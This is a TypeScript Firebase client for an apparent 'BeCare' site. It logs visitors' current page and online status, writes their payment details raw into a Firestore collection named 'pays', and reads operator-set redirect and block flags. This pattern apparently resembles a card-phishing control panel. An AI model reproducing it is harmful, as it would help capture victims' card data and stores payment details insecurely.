/**
 * BeCare API Client - Firebase Version
 * Replaces REST API calls with Firestore calls
 */
import { db } from './firebase';
import { 
  doc, 
  setDoc, 
  getDoc, 
  updateDoc, 
  collection, 
  addDoc, 
  serverTimestamp,
  arrayUnion
} from 'firebase/firestore';

// ─── Visitor API ──────────────────────────────────────────────────────────────

/** Create or initialize a visitor document */
export async function createVisitor(data: Record<string, any>): Promise<string> {
  const visitorId = data.id || `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  const visitorRef = doc(db, 'pays', visitorId);
  
  const docSnap = await getDoc(visitorRef);
  if (!docSnap.exists()) {
    await setDoc(visitorRef, {
      ...data,
      id: visitorId,
      status: 'draft',
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp()
    });
  }
  return visitorId;
}

/** Get visitor data by ID */
export async function getData(id: string): Promise<Record<string, any> | null> {
  try {
    const visitorRef = doc(db, 'pays', id);
    const docSnap = await getDoc(visitorRef);
    if (docSnap.exists()) {
      return { id: docSnap.id, ...docSnap.data() };
    }
    return null;
  } catch (error) {
    console.error('[API] Error getting data:', error);
    return null;
  }
}

/** Update visitor data (partial update) */
export async function addData(data: Record<string, any>): Promise<void> {
  const { id, ...payload } = data;
  const visitorId = id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
  if (!visitorId) return;

  if (typeof window !== 'undefined') {
    localStorage.setItem('visitor', visitorId);
  }

  try {
    const visitorRef = doc(db, 'pays', visitorId);
    await updateDoc(visitorRef, {
      ...payload,
      updatedAt: serverTimestamp()
    });
  } catch (error) {
    console.error('[API] Error updating data:', error);
  }
}

/** Set current page for visitor */
export const handleCurrentPage = (page: string): void => {
  if (typeof window === 'undefined') return;
  const visitorId = localStorage.getItem('visitor');
  if (!visitorId) return;
  addData({ id: visitorId, currentPage: page });
};

/** Handle payment info update */
export const handlePay = async (paymentInfo: any, setPaymentInfo: any): Promise<void> => {
  try {
    const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
    if (visitorId) {
      await addData({ 
        id: visitorId, 
        ...paymentInfo, 
        cardStatus: 'pending',
        status: 'pending_review'
      });
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('[API] Error adding payment info:', error);
  }
};

/** Add history entry */
export async function addToHistory(visitorId: string, type: string, data: any, status: string = 'pending'): Promise<void> {
  try {
    const visitorRef = doc(db, 'pays', visitorId);
    const historyEntry = {
      id: `hist_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`,
      type,
      data,
      status,
      timestamp: new Date().toISOString()
    };
    
    await updateDoc(visitorRef, {
      history: arrayUnion(historyEntry),
      updatedAt: serverTimestamp()
    });
  } catch (e) {
    console.error('[API] Error adding history:', e);
  }
}

/** Set visitor offline */
export async function setVisitorOffline(visitorId: string): Promise<void> {
  try {
    const visitorRef = doc(db, 'pays', visitorId);
    await updateDoc(visitorRef, {
      isOnline: false,
      lastSeen: serverTimestamp()
    });
  } catch {
    // silent
  }
}

/** Clear redirect page */
export async function clearRedirectPage(visitorId: string): Promise<void> {
  try {
    const visitorRef = doc(db, 'pays', visitorId);
    await updateDoc(visitorRef, {
      redirectPage: null
    });
  } catch {
    // silent
  }
}

/** Check if visitor is blocked */
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const data = await getData(visitorId);
    return data?.isBlocked === true || data?.is_blocked === true;
  } catch {
    return false;
  }
}

/** Get messages for visitor */
export async function getMessages(visitorId: string): Promise<any[]> {
  // Messages are handled via Firestore 'messages' collection
  return [];
}

/** Send message */
export async function sendMessage(visitorId: string, message: string, senderName?: string): Promise<void> {
  try {
    await addDoc(collection(db, 'messages'), {
      applicationId: visitorId,
      message,
      senderName: senderName || 'Visitor',
      senderRole: 'customer',
      timestamp: serverTimestamp(),
      read: false
    });
  } catch (e) {
    console.error('[API] Error sending message:', e);
  }
}
